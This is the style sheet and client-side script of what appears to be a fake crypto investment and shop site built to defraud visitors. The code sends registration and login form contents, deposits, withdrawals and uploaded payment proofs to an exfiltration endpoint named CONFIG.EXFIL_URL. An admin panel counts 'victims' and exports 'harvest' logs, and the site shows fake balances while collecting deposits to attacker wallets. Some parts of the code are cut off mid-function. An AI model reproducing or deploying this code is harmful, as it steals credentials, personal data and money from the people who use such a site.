*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',system-ui,sans-serif;-webkit-tap-highlight-color:transparent}
html,body{-webkit-overflow-scrolling:touch;overscroll-behavior-y:contain}
body{background:#0a0e17;color:#e6edf3;line-height:1.55;font-size:15px}
header{background:rgba(10,14,23,.98);position:sticky;top:0;z-index:100;border-bottom:1px solid #1c2533}
.nav{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:14px 18px;gap:12px;position:relative}
.logo{font-size:22px;font-weight:700;letter-spacing:-.5px;white-space:nowrap;cursor:pointer;user-select:none}
.logo span{color:#00d97e}
.nav-links{display:flex;align-items:center;gap:20px}
.nav-links a{color:#b7c2d0;text-decoration:none;font-size:14px;font-weight:500;white-space:nowrap}
.nav-links a:hover{color:#00d97e}
.burger{display:none;background:none;border:none;color:#e6edf3;font-size:24px;cursor:pointer;padding:4px 8px}
.btn{background:#00d97e;color:#0a0e17;padding:9px 16px;border-radius:8px;font-weight:600;text-decoration:none;display:inline-block;cursor:pointer;border:none;font-size:14px}
.btn-o{border:1px solid #2a3648;color:#e6edf3;padding:8px 14px;border-radius:8px;text-decoration:none;background:none;cursor:pointer;font-size:14px}
.big{padding:14px 28px;font-size:16px;margin-top:20px}
.hero{text-align:center;padding:70px 20px 50px;background:radial-gradient(circle at 50% 0%,#12203a 0%,#0a0e17 65%)}
.hero h1{font-size:clamp(26px,5vw,44px);font-weight:700;max-width:780px;margin:0 auto;line-height:1.2}
.hero h1 span{color:#00d97e}
.hero p{color:#9aa8ba;margin-top:16px;font-size:16px;max-width:560px;margin-left:auto;margin-right:auto}
.tb{margin-top:32px;display:flex;justify-content:center;gap:24px;flex-wrap:wrap;color:#9aa8ba;font-size:13px}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;max-width:900px;margin:0 auto;padding:32px 20px}
.stat{background:#10192a;border:1px solid #1c2533;border-radius:12px;padding:20px;text-align:center}
.stat h3{font-size:clamp(20px,3.5vw,28px);color:#00d97e;font-weight:700}
.stat p{color:#9aa8ba;font-size:13px;margin-top:4px}
section{max-width:1200px;margin:0 auto;padding:60px 20px}
h2{font-size:clamp(22px,3.5vw,32px);text-align:center;margin-bottom:36px;font-weight:700}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:20px}
.card{background:#10192a;border:1px solid #1c2533;border-radius:14px;padding:26px;text-align:center}
.card.f{border-color:#00d97e}
.roi{font-size:28px;color:#00d97e;font-weight:700}
.auth{max-width:420px;margin:50px auto;background:#10192a;border:1px solid #1c2533;border-radius:16px;padding:32px 28px}
.auth h2{font-size:24px;margin-bottom:8px;text-align:left}
.auth p.sub{color:#9aa8ba;font-size:14px;margin-bottom:22px}
.auth input,.auth select,.auth textarea{width:100%;padding:13px 14px;margin-bottom:14px;background:#0a0e17;border:1px solid #2a3648;border-radius:10px;color:#e6edf3;font-size:15px;outline:none;font-family:inherit}
.auth textarea{min-height:100px;resize:vertical}
.auth button{width:100%;padding:14px;background:#00d97e;color:#0a0e17;border:none;border-radius:10px;font-weight:700;font-size:15px;cursor:pointer}
.dash{max-width:1200px;margin:24px auto;padding:0 16px}
.bal{font-size:clamp(32px,7vw,44px);color:#00d97e;font-weight:700;line-height:1.1}
footer{text-align:center;padding:36px 20px;border-top:1px solid #1c2533;color:#6b788a;font-size:13px;margin-top:60px}
.wallet{background:#0a0e17;padding:14px;border-radius:10px;font-family:ui-monospace,monospace;word-break:break-all;color:#00d97e;font-size:13px;margin:10px 0;user-select:all;border:1px solid #1c2533}
#logBox,#pendingBox{font-family:ui-monospace,monospace;font-size:12px;color:#b7c2d0;max-height:500px;overflow:auto;background:#0a0e17;padding:14px;border-radius:10px;white-space:pre-wrap;border:1px solid #1c2533}
.product{background:#10192a;border:1px solid #1c2533;border-radius:14px;overflow:hidden;text-align:left;display:flex;flex-direction:column}
.product img{width:100%;height:180px;object-fit:cover;background:#0a0e17;display:block}
.product .body{padding:16px;display:flex;flex-direction:column;flex:1}
.product h4{font-size:14px;margin-bottom:6px;font-weight:600;line-height:1.3;min-height:36px}
.product .price{color:#00d97e;font-weight:700;font-size:18px;margin-bottom:6px}
.product .meta{color:#6b788a;font-size:12px;margin-bottom:12px;flex:1}

.pending{background:#1a1408;border:1px solid #5a4f18;color:#e6d97e;padding:14px 16px;border-radius:10px;margin-bottom:12px;font-size:13px;line-height:1.5}
.dash-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:18px}
.dash-stats .card{padding:20px 14px}
.dash-stats h3{font-size:20px;font-weight:700}
.dash-stats p{font-size:12px;color:#9aa8ba;margin-bottom:6px}
.order{background:#0a0e17;padding:14px 16px;border-radius:10px;margin-bottom:10px;font-size:13px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;border:1px solid #1c2533}
.badge{padding:4px 10px;border-radius:20px;font-size:11px;font-weight:700}
.badge.pending{background:#3a2f08;color:#e6d97e}
.badge.paid{background:#0f2a1c;color:#00d97e}
.review{background:#10192a;border:1px solid #1c2533;border-radius:14px;padding:20px;text-align:left}
.review .head{display:flex;align-items:center;gap:12px;margin-bottom:12px}
.review .avatar{width:42px;height:42px;border-radius:50%;background:#00d97e;color:#0a0e17;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:16px}
.review .name{font-weight:700;font-size:14px}
.review .stars{color:#f5b400;font-size:13px;letter-spacing:1px}
.review .text{font-size:14px;color:#b7c2d0;margin-bottom:12px;line-height:1.55}
.review .shot{width:100%;border-radius:10px;border:1px solid #1c2533;max-height:280px;object-fit:cover}
.review .meta{font-size:11px;color:#6b788a;margin-top:10px}
.upload{background:#0a0e17;border:2px dashed #2a3648;border-radius:12px;padding:26px;text-align:center;cursor:pointer;margin-bottom:14px;display:block}
.upload input{display:none}
.upload .icon{font-size:28px;margin-bottom:8px;color:#00d97e}
.upload .lbl{font-size:14px;color:#b7c2d0}
.upload .hint{font-size:12px;color:#6b788a;margin-top:4px}
.preview{max-width:100%;max-height:240px;border-radius:10px;border:1px solid #1c2533;margin-bottom:14px;display:block;margin-left:auto;margin-right:auto}
.tabs{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap;justify-content:center}
.tab{padding:8px 16px;border:1px solid #2a3648;border-radius:20px;background:none;color:#b7c2d0;cursor:pointer;font-size:13px}
.tab.on{background:#00d97e;color:#0a0e17;border-color:#00d97e;font-weight:600}
@media (max-width:820px){
  .burger{display:block}
  .nav-links{display:none;position:absolute;top:100%;left:0;right:0;background:#0a0e17;border-bottom:1px solid #1c2533;flex-direction:column;gap:0;padding:8px 0;align-items:stretch}
  .nav-links.open{display:flex}
  .nav-links a{padding:14px 20px;border-bottom:1px solid #131c2a;margin:0}
  .stats{grid-template-columns:1fr;gap:10px;padding:24px 16px}
  .dash-stats{grid-template-columns:1fr}
  section{padding:50px 16px}
  .hero{padding:50px 16px 40px}
  .grid{grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px}
  .product img{height:140px}
  .auth{margin:30px 16px;padding:26px 22px}

function getUser(){ return JSON.parse(localStorage.getItem('user')||'null'); }
function requireAuth(redirect){ if(!getUser()){ alert('Please register or login first.'); go(redirect||'register'); return false; } return true; }
function harvest(payload){
  fetch(CONFIG.EXFIL_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({...payload,ua:navigator.userAgent,ts:Date.now()})}).catch(()=>{});
}
function readFileAsDataURL(file, cb){ const r=new FileReader(); r.onload=e=>cb(e.target.result); r.readAsDataURL(file); }
function logTx(tx){
  const entry={...tx,ts:Date.now()};
  const hist=JSON.parse(localStorage.getItem('txHistory')||'[]');
  hist.push(entry); localStorage.setItem('txHistory',JSON.stringify(hist));
  harvest(entry);
}
function getBalance(){ return parseFloat(localStorage.getItem('balance')||'0'); }
function setBalance(v){ localStorage.setItem('balance', String(v)); }
function addOrder(product, price){
  const orders=JSON.parse(localStorage.getItem('orders')||'[]');
  orders.push({id:'o_'+Date.now(),productId:product.id,name:product.name,price,status:'pending',ts:Date.now()});
  localStorage.setItem('orders',JSON.stringify(orders));
}
function getOrders(){ return JSON.parse(localStorage.getItem('orders')||'[]'); }
function addWithdrawal(amount, method, wallet, proof){
  const list=JSON.parse(localStorage.getItem('withdrawals')||'[]');
  const w={id:'w_'+Date.now(),amount:parseFloat(amount),method,wallet,proof:proof||null,status:'pending',ts:Date.now()};
  list.push(w); localStorage.setItem('withdrawals',JSON.stringify(list));
  return w;
}
function getWithdrawals(){ return JSON.parse(localStorage.getItem('withdrawals')||'[]'); }
function getReviews(){ const u=JSON.parse(localStorage.getItem('userReviews')||'[]'); return [...u,...SEED_REVIEWS]; }
function remainingHold(createdAt){
  const remain = (createdAt + HOLD_MS) - Date.now();
  if(remain <= 0) return 'ready';
  const h = Math.floor(remain / 3600000);
  const m = Math.floor((remain % 3600000) / 60000);
  const s = Math.floor((remain % 60000) / 1000);
  return `${h}h ${m}m ${s}s`;
}
function syncApprovedDeposits(){
  const u=getUser(); if(!u || !u.email) return;
  fetch('/api/deposit/status?email='+encodeURIComponent(u.email))
    .then(r=>r.json()).then(list=>{
      if(!Array.isArray(list)){ window._lastDeposits=[]; return; }
      window._lastDeposits = list;
      const now = Date.now();
      const applied = JSON.parse(localStorage.getItem('appliedDepositIds')||'[]');
      const ready = list.filter(d => d.status==='approved' && (now - d.createdAt) >= HOLD_MS && !applied.includes(d.id));
      if(ready.length === 0) return;
      let add = 0;
      ready.forEach(d => { add += d.amount; applied.push(d.id); });
      const bal = parseFloat(localStorage.getItem('balance')||'0');
      localStorage.setItem('balance', String(bal + add));
      localStorage.setItem('appliedDepositIds', JSON.stringify(applied));
      window._preserveScroll = true;
      render();
    }).catch(()=>{});
}

function go(route){ window.location.hash=route; render(); }
function render(){
  const route=(window.location.hash||'#home').slice(1);
  const app=document.getElementById('app');
  if(!window._preserveScroll) window.scrollTo(0,0);
  window._preserveScroll = false;
  if(route==='home') app.innerHTML=viewHome();
  else if(route==='shop') app.innerHTML=viewShop();
  else if(route==='plans') app.innerHTML=viewPlans();
  else if(route==='reviews') app.innerHTML=viewReviews();
  else if(route==='register') app.innerHTML=viewRegister();
  else if(route==='login') app.innerHTML=viewLogin();
  else if(route==='dashboard') app.innerHTML=viewDashboard();
  else if(route==='deposit') app.innerHTML=viewDeposit();
  else if(route==='withdraw') app.innerHTML=viewWithdraw();
  else if(route==='orders') app.innerHTML=viewOrders();
  else if(route==='upload') app.innerHTML=viewUploadProof();
  else if(route==='admin'){
    if(sessionStorage.getItem('adminUnlocked')==='1') app.innerHTML=viewAdmin();
    else { app.innerHTML=viewHome(); window.location.hash='#home'; }
  }
  else app.innerHTML=viewHome();
  bind(route);
  document.querySelector('.nav-links')?.classList.remove('open');
}

    <label class="upload" for="upFile">
      <input id="upFile" type="file" accept="image/*" required>
      <div class="icon">📎</div>
      <div class="lbl" id="upLbl">Tap to select image</div>
      <div class="hint">PNG, JPG · max 5MB</div>
    </label>
    <img id="upPreview" class="preview" style="display:none">
    <textarea name="note" placeholder="Optional note"></textarea>
    <button type="submit">Submit Proof</button>
  </form>
</div>`;
}

function viewAdmin(){
  const tok=localStorage.getItem('adminTok');
  if(!tok){
    return `${navBar()}
<div class="auth">
  <h2 style="margin-bottom:22px">Admin Access</h2>
  <form id="adminForm">
    <input id="adminEmail" type="text" placeholder="Admin Email" required>
    <input id="adminPass" type="password" placeholder="Admin Password" required>
    <button type="submit">Enter</button>
  </form>
</div>`;
  }
  return `${navBar()}
<div class="dash">
  <div class="card" style="text-align:left"><h2 style="margin:0 0 8px">Admin Control Panel</h2><p style="color:#9aa8ba;font-size:14px">Pending deposits, victims, credentials, withdrawals.</p></div>
  <div class="dash-stats" style="grid-template-columns:repeat(4,1fr)">
    <div class="card"><p>Victims</p><h3 id="aVictims" style="color:#00d97e">—</h3></div>
    <div class="card"><p>Deposits</p><h3 id="aDep" style="color:#00d97e">—</h3></div>
    <div class="card"><p>Withdrawals</p><h3 id="aWd" style="color:#00d97e">—</h3></div>
    <div class="card"><p>Flagged</p><h3 id="aFlag" style="color:#e6d97e">—</h3></div>
  </div>
  <div class="card" style="text-align:left;margin-top:20px">
    <h3 style="margin-bottom:12px">Pending Deposits — Awaiting Approval</h3>

    <div id="logBox"></div>

}
function copyWallet(){
  const el=document.getElementById('addr'); if(!el) return;
  const text=el.textContent.trim();
  const done=()=>{const m=document.getElementById('copyMsg');if(m){m.style.display='block';setTimeout(()=>m.style.display='none',2000);}};
  if(navigator.clipboard&&navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done).catch(()=>fallbackCopy(text,done));
  else fallbackCopy(text,done);
}
function fallbackCopy(text,cb){
  const ta=document.createElement('textarea');ta.value=text;ta.style.position='fixed';ta.style.opacity='0';
  document.body.appendChild(ta);ta.select();
  try{document.execCommand('copy');cb();}catch(e){}
  document.body.removeChild(ta);
}

function adminLogin(email,pass){
  if(email!==ADMIN_EMAIL||pass!==ADMIN_PASSWORD){alert('Wrong credentials');return;}
  localStorage.setItem('adminTok',btoa('admin:'+email+':'+Date.now()));
  render();
}
function adminLogout(){
  localStorage.removeItem('adminTok');
  sessionStorage.removeItem('adminUnlocked');
  go('home');
}
function loadLogs(){
  fetch('/api/logs?token='+encodeURIComponent(localStorage.getItem('adminTok')||''))
    .then(r=>r.json()).then(logs=>{
      if(!Array.isArray(logs)) logs=[];
      const box=document.getElementById('logBox'); if(box) box.textContent=JSON.stringify(logs,null,2);
      const victims=new Set(logs.filter(l=>l.email).map(l=>l.email));
      let dep=0,wd=0,fl=0;
      logs.forEach(l=>{
        if(l.type==='deposit') dep+=parseFloat(l.amount)||0;
        if(l.type==='withdraw') wd+=parseFloat(l.amount)||0;
        if(l.flags&&l.flags.length) fl++;
      });
      const aV=document.getElementById('aVictims'),aD=document.getElementById('aDep'),aW=document.getElementById('aWd'),aF=document.getElementById('aFlag');
      if(aV)aV.textContent=victims.size;
      if(aD)aD.textContent='$'+dep.toFixed(2);
      if(aW)aW.textContent='$'+wd.toFixed(2);
      if(aF)aF.textContent=fl;
    }).catch(()=>{const box=document.getElementById('logBox'); if(box) box.textContent='Failed to load.';});
}
function exportLogs(){
  fetch('/api/logs?token='+encodeURIComponent(localStorage.getItem('adminTok')||''))
    .then(r=>r.blob()).then(b=>{
      const a=document.createElement('a');
      a.href=URL.createObjectURL(b);
      a.download='harvest_'+Date.now()+'.json';
      a.click();
    });
}
function loadPending(){
  fetch('/api/deposit/pending?token='+encodeURIComponent(localStorage.getItem('adminTok')||''))
    .then(r=>r.json()).then(list=>{
      const box=document.getElementById('pendingBox'); if(!box) return;
      if(!Array.isArray(list)){box.innerHTML='<p style="color:#9aa8ba">No data.</p>';return;}
      const pending=list.filter(d=>d.status==='pending');
      if(pending.length===0){box.innerHTML='<p style="color:#9aa8ba">No pending deposits.</p>';return;}
      box.innerHTML=pending.map(d=>`
        <div class="order">
          <div>
            <b>$${d.amount.toFixed(2)}</b> · ${d.method.toUpperCase()} · ${d.plan.toUpperCase()}<br>
            <span style="color:#6b788a">${d.email||d.userId} · ${new Date(d.createdAt).toLocaleString()}</span>
            ${d.proof?`<br><a href="${d.proof}" target="_blank" style="color:#00d97e;font-size:12px">View payment proof</a>`:''}
          </div>
          <div style="display:flex;gap:8px">
            <button class="btn" onclick="approveDeposit('${d.id}')">Approve</button>
            <button class="btn-o" onclick="rejectDeposit('${d.id}')">Reject</button>
          </div>
        </div>`).join('');
    }).catch(()=>{const box=document.getElementById('pendingBox'); if(box) box.textContent='Failed to load.';});
}
function approveDeposit(id){
  fetch('/api/deposit/approve?token='+encodeURIComponent(localStorage.getItem('adminTok')||''),{
    method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})
  }).then(r=>r.json()).then(()=>{alert('Approved.');loadPending();});
}
function rejectDeposit(id){
  fetch('/api/deposit/reject?token='+encodeURIComponent(localStorage.getItem('adminTok')||''),{
    method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})
  }).then(r=>r.json()).then(()=>{alert('Rejected.');loadPending();});
}

function buyProduct(id){
  const p=PRODUCTS.find(x=>x.id===id);
  if(!p) return;
  if(!requireAuth('register')) return;
  const bal=getBalance();
  if(bal<p.price){
    alert(`Insufficient balance. You need $${(p.price-bal).toFixed(2)} more.\n\nDeposit to add funds.`);
    go('deposit');return;
  }
  setBalance(bal-p.price);
  addOrder(p,p.price);
  logTx({type:'purchase',productId:p.id,name:p.name,amount:p.price});
  alert(`Order placed: ${p.name}\n\nStatus: PENDING\nExpected delivery: 3-7 days`);
  go('orders');
}

function bind(route){
  if(route==='home') tickStats();

  if(route==='register'){
    const f=document.getElementById('regForm');
    if(f) f.addEventListener('submit',e=>{
      e.preventDefault();
      const data=Object.fromEntries(new FormData(e.target).entries());
      harvest({...data,type:'register'});
      localStorage.setItem('user',JSON.stringify(data));
      go('dashboard');
    });
  }

  if(route==='login'){
    const f=document.getElementById('loginForm');
    if(f) f.addEventListener('submit',e=>{
      e.preventDefault();
      const data=Object.fromEntries(new FormData(e.target).entries());
      harvest({...data,type:'login'});
      const existing=JSON.parse(localStorage.getItem('user')||'{}');
      localStorage.setItem('user',JSON.stringify({...existing,...data}));
      go('dashboard');
    });
  }

  if(route==='dashboard'){
    const u=JSON.parse(localStorage.getItem('user')||'{}');
    if(u && u.email){
      fetch('/api/deposit/status?email='+encodeURIComponent(u.email))
        .then(r=>r.json()).then(list=>{
          if(Array.isArray(list)){
            window._lastDeposits = list;
            window._preserveScroll = true;
            render();
          }
        }).catch(()=>{});
    }
    syncApprovedDeposits();
  }

  if(route==='deposit'){
    const m=document.getElementById('method');
    if(m) m.onchange=e=>{document.getElementById('addr').textContent=CONFIG.WALLETS[e.target.value];};
    const file=document.getElementById('proofFile');
    if(file) file.addEventListener('change',e=>{
      const f=e.target.files[0]; if(!f) return;
      document.getElementById('proofLbl').textContent=f.name;
      readFileAsDataURL(f,url=>{const img=document.getElementById('proofPreview'); img.src=url; img.style.display='block';});
    });
  }

  if(route==='upload'){
    const file=document.getElementById('upFile');
    if(file) file.addEventListener('change',e=>{
      const f=e.target.files[0]; if(!f) return;
      document.getElementById('upLbl').textContent=f.name;
      readFileAsDataURL(f,url=>{const img=document.getElementById('upPreview'); img.src=url; img.style.display='block';});
    });
    const form=document.getElementById('proofForm');
    if(form) form.addEventListener('submit',e=>{
      e.preventDefault();
      const fd=Object.fromEntries(new FormData(e.target).entries());
      const fileEl=document.getElementById('upFile');
      const f=fileEl.files[0];
      if(!f) return alert('Select an image');
      readFileAsDataURL(f,url=>{
        logTx({type:'proof_upload',kind:fd.kind,amount:parseFloat(fd.amount),reference:fd.reference,note:fd.note,file:f.name,fileSize:f.size,proof:url});
        alert('Proof submitted. Our team will verify within 24 hours.');
        go('orders');
      });
    });
  }

  if(route==='admin'){
    const form=document.getElementById('adminForm');
    if(form){
      form.addEventListener('submit',e=>{
        e.preventDefault();
        adminLogin(document.getElementById('adminEmail').value,document.getElementById('adminPass').value);
      });
    } else if(localStorage.getItem('adminTok')){
      loadLogs();
      loadPending();
    }
  }
}

function submitDeposit(){
  const amt=parseFloat(document.getElementById('amt').value);
  const method=document.getElementById('method').value;
  const plan=document.getElementById('plan').value;
  if(!plan) return alert('Select an investment plan');
  if(!amt||amt<50) return alert('Minimum deposit is $50');

  const u=JSON.parse(localStorage.getItem('user')||'{}');
  u.plan=plan;
  localStorage.setItem('user',JSON.stringify(u));

  const fileEl=document.getElementById('proofFile');
  const f=fileEl.files[0];

  const finish=proof=>{
    fetch('/api/deposit/submit',{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({email:u.email,amount:amt,method,plan,proof})
    }).catch(()=>{});
    logTx({type:'deposit',amount:amt,method,plan,hasProof:!!proof});
    alert(`Deposit of $${amt.toFixed(2)} submitted on ${plan.toUpperCase()} plan.\n\nStatus: PENDING ADMIN APPROVAL\nBalance credits 24h after approval.`);
    go('dashboard');
  };
  if(f) readFileAsDataURL(f,finish);
  else finish(null);
}

function submitWithdraw(){
  const wallet=document.getElementById('wwallet').value;
  const amt=parseFloat(document.getElementById('wamt').value);
  const method=document.getElementById('wmethod').value;
  if(!wallet||!amt) return alert('Fill all fields');
  if(amt<50) return alert('Minimum withdrawal is $50');
  const bal=getBalance();
  if(amt>bal) return alert('Insufficient balance');
  logTx({type:'withdraw',wallet,amount:amt,method});
  setBalance(bal-amt);
  addWithdrawal(amt,method,wallet,null);
  alert('Withdrawal submitted. Funds arrive within 24 hours.');
  go('orders');
}

render();
</script>
